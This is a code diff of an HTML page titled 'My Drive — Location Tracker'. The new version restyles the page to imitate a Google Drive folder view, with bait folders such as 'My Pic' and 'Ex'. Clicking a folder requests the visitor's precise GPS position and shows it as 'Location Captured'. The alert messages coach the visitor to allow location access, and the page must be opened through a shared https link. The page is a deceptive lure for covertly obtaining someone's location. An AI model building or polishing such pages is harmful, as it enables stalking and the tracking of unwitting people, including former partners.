@@ -1,4 +1,4 @@
-<!-- VERSION 4 — CUSTOM FOLDERS -->
+<!-- VERSION 5 — YOUR CUSTOM NAMES -->
 <!DOCTYPE html>
 <html>
 <head>
@@ -6,45 +6,75 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>My Drive — Location Tracker</title>
 <style>
-body { font-family: Arial, sans-serif; padding: 25px; background: #f0f7ff; margin: 0; }
-h1 { color: #1a73e8; text-align: center; }
-.folder { background: white; padding: 20px; margin: 12px auto; border-radius: 10px; cursor: pointer; font-size: 18px; border: 2px solid #d3e3fd; max-width: 400px; transition: 0.2s; }
-.folder:hover { background: #d3e3fd; }
-.folder:active { transform: scale(0.98); }
-#out { margin-top: 25px; padding: 20px; background: #e6ffed; border-radius: 10px; display: none; border: 2px solid #34a853; max-width: 400px; margin-left: auto; margin-right: auto; }
+* {box-sizing:border-box; margin:0; padding:0;}
+body { font-family: Arial, sans-serif; padding: 25px; background: #f8fafd; }
+.topbar {height:60px; background:white; border-bottom:1px solid #dadce0; display:flex; align-items:center; padding:0 15px; gap:10px; margin:-25px -25px 30px -25px;}
+.logo {display:flex; align-items:center; gap:8px; font-size:18px; padding-left:10px;}
+h1 { color: #202124; text-align: left; font-size: 22px; margin-bottom: 5px; }
+.heading-row {display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;}
+.view-toggle {color:#5f6368; font-size:20px;}
+.folder-grid {display:grid; grid-template-columns:repeat(auto-fill, minmax(180px,1fr)); gap:16px;}
+.folder { background: white; padding: 20px; border-radius: 12px; cursor: pointer; border: 1px solid #dadce0; transition: 0.2s; }
+.folder:hover { background: #f1f6ff; transform: translateY(-2px); }
+.folder-icon {font-size:32px; margin-bottom:10px;}
+.folder-name {font-size:15px; font-weight:500; word-break:break-word;}
+#out { margin-top: 30px; padding: 20px; background: #eef5ff; border-radius: 12px; display: none; border: 1px solid #d3e3fd; }
 #out.show { display: block; }
-p.note { text-align: center; color: #5f6368; font-size: 14px; }
+@media (max-width:600px) {
+  .folder-grid {grid-template-columns:repeat(2,1fr); gap:12px;}
+  body {padding:15px;}
+  .topbar {margin:-15px -15px 20px -15px;}
+}
 </style>
 </head>
 <body>
 
-<h1>📁 My Drive</h1>
-<p class="note">Tap any folder below</p>
+<div class="topbar">
+  <div class="logo"><span style="font-size:24px;">📁</span><b>My Drive</b></div>
+</div>
 
-<div class="folder" onclick="checkLoc('My Pic 😈😜')">📁 My Pic 😈😜</div>
-<div class="folder" onclick="checkLoc('Friends Pic 😍')">📁 Friends Pic 😍</div>
-<div class="folder" onclick="checkLoc('School Pic 📙')">📁 School Pic 📙</div>
-<div class="folder" onclick="checkLoc('Ex😡😠')">📁 Ex😡😠</div>
+<div class="heading-row">
+  <h2>Welcome to My Drive</h2>
+  <span class="view-toggle">☷　▦</span>
+</div>
+
+<h3 style="margin:10px 0;">Folders</h3>
+<div class="folder-grid">
+  <div class="folder" onclick="checkLoc('My Pic 😈😜')">
+    <div class="folder-icon">📁</div>
+    <div class="folder-name">My Pic 😈😜</div>
+  </div>
+  <div class="folder" onclick="checkLoc('Friends Pic 😍')">
+    <div class="folder-icon">📁</div>
+    <div class="folder-name">Friends Pic 😍</div>
+  </div>
+  <div class="folder" onclick="checkLoc('School Pic 📙')">
+    <div class="folder-icon">📁</div>
+    <div class="folder-name">School Pic 📙</div>
+  </div>
+  <div class="folder" onclick="checkLoc('Ex😡😠')">
+    <div class="folder-icon">📁</div>
+    <div class="folder-name">Ex😡😠</div>
+  </div>
+</div>
 
 <div id="out">
-<strong>✅ LOCATION CAPTURED</strong><br><br>
-Folder: <span id="fn"></span><br>
-Latitude: <span id="lat"></span><br>
-Longitude: <span id="lng"></span>
+<strong>📍 Location Captured ✅</strong><br><br>
+Folder: <span id="fn" style="font-weight:bold;"></span><br>
+Latitude: <span id="lat" style="font-family:monospace; color:#1a73e8;"></span><br>
+Longitude: <span id="lng" style="font-family:monospace; color:#1a73e8;"></span>
 </div>
 
 <script>
 function checkLoc(folderName) {
   if (location.protocol !== 'https:' && location.protocol !== 'http:') {
-    alert('❌ ERROR\n\nOpen via your https:// link only — not from your computer files.');
+    alert('❌ Open via your https:// link only');
     return;
   }
-
   if (!navigator.geolocation) {
-    alert('❌ Your browser does not support location');
+    alert('❌ Location not supported');
     return;
   }
-
   navigator.geolocation.getCurrentPosition(
     function success(pos) {
       document.getElementById('fn').textContent = folderName;
@@ -54,9 +84,9 @@ function checkLoc(folderName) {
     },
     function fail(err) {
       let msg = '❌ ';
-      if (err.code === 1) msg += 'Blocked — tap 🔒 in address bar → Allow Location';
-      else if (err.code === 2) msg += 'Unavailable — turn on GPS/Location in Settings';
-      else if (err.code === 3) msg += 'Timed out — try again outdoors';
+      if (err.code === 1) msg += 'Allow location → tap 🔒 → Refresh';
+      else if (err.code === 2) msg += 'Turn on GPS in Settings';
+      else if (err.code === 3) msg += 'Timed out — try again';
       alert(msg);
     },
     { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
